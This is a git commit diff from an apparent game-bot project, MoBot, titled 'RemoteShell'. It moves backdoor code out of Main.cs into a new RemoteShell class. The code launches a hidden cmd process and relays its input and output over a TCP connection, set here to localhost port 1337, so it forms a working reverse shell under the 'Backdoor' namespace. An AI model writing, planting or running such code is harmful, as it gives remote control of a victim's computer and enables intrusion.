1da4d6ce50a0f645fc1fbbb38f4de7c60f76b917
Evgeniy Shilkin <e.shilkin@sinvent.ru>
2017-05-19 17:54:28 +0300

    RemoteShell

--- MoBot/Scripts/Backdoor/Main.cs
+++ MoBot/Scripts/Backdoor/Main.cs
@@ -11,10 +11,6 @@ namespace MoBot.Scripts.Backdoor
         private const string Host = "localhost";
         private const int Port = 1337;
 
-        private StreamReader input;
-        private StreamWriter output;
-        private Process shell;
-
         [Initialisation]
         public void Start()
         {
@@ -23,20 +19,7 @@ namespace MoBot.Scripts.Backdoor
                 var client = new TcpClient(Host, Port);
                 var stream = client.GetStream();
 
-                input = new StreamReader(stream);
-                output = new StreamWriter(stream) {AutoFlush = true};
-
-                var processStart = new ProcessStartInfo("cmd")
-                {
-                    CreateNoWindow = true,
-                    UseShellExecute = false,
-                    RedirectStandardError = true,
-                    RedirectStandardInput = true,
-                    RedirectStandardOutput = true
-                };
-
-                shell = new Process {StartInfo = processStart};
-                shell.Start();
+                
             }
             catch (Exception)
             {
---
+++ MoBot/Scripts/Backdoor/RemoteShell.cs
@@ -0,0 +1,92 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Threading;
+
+namespace MoBot.Scripts.Backdoor
+{
+    internal class RemoteShell : IDisposable
+    {
+        private readonly StreamReader input;
+        private readonly StreamWriter output;
+
+        private readonly StreamReader fromShell;
+        private readonly StreamWriter toShell;
+
+        private readonly Process shell;
+
+        private readonly Thread shellThread;
+        private readonly Thread remoteThread;
+
+        public RemoteShell(Stream stream)
+        {
+            input = new StreamReader(stream);
+            output = new StreamWriter(stream) { AutoFlush = true };
+
+            var processStart = new ProcessStartInfo("cmd")
+            {
+                CreateNoWindow = true,
+                UseShellExecute = false,
+                RedirectStandardError = true,
+                RedirectStandardInput = true,
+                RedirectStandardOutput = true
+            };
+
+            shell = new Process { StartInfo = processStart };
+            shell.Start();
+
+            fromShell = shell.StandardOutput;
+            toShell = shell.StandardInput;
+
+            shellThread = new Thread(GetShellInput);
+            remoteThread = new Thread(GetRemoteInput);
+        }
+
+        private void GetShellInput()
+        {
+            try
+            {
+                string buff;
+                while ((buff = fromShell.ReadLine()) != null)
+                {
+                    output.WriteLine(buff);
+                }
+            }
+            catch (Exception)
+            {
+                // ignored
+            }
+        }
+
+        private void GetRemoteInput()
+        {
+            try
+            {
+                string buff;
+                while ((buff = input.ReadLine()) != null)
+                {
+                    toShell.WriteLine(buff);
+                }
+            }
+            catch (Exception)
+            {
+                // ignored
+            }
+        }
+
+        public void Dispose()
+        {
+            input?.Dispose();
+            output?.Dispose();
+
+            shell?.Close();
+            shell?.Dispose();
+
+            toShell?.Dispose();
+            fromShell?.Dispose();
+
+            shellThread.Abort();
+            remoteThread.Abort();
+        }
+    }
+}
